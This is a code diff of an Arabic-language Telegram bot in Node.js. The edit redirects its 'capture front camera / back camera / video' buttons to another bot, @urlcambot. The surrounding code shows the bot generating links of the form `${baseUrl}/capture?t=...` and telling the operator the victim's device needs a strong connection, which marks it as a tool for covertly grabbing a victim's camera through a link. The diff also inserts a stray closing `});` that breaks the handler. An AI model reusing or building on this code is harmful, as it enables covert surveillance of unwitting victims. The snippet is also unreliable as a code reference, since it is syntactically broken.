@@ -1293,13 +1293,23 @@ bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
-    // تم إضافة هذا الشرط ليتعامل مع الكاميرات والفيديو ويرسل بوتك مباشرة
+    // معالجة الأزرار الثلاثة (كاميرا أمامية، خلفية، وفيديو) وإرسال النص والزر الشفاف
     const action = data.split(':')[0];
     if (action === 'captureFront' || action === 'captureBack' || action === 'capture_video' || data === 'capture_video') {
-        await bot.sendMessage(chatId, "عذراً، هذه الميزة متوقفة مؤقتاً في هذا البوت.\n\nيرجى استخدام بوت التصوير عبر رابط متطور:\n@urlcambot");
+        await bot.sendMessage(chatId, "عذراً، هذه الميزة متوقفة مؤقتاً في هذا البوت.\n\nيرجى استخدام بوت التصوير عبر رابط متطور:", {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: '📷 بوت تصوير عبر رابط', url: 'https://t.me/urlcambot' }
+                    ]
+                ]
+            }
+        });
         await bot.answerCallbackQuery(callbackQuery.id);
         return;
     }
+});
+
 
     if (data === 'capture_video') {
         const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture?t=${generateShortToken(chatId, 'capture_video')}`;
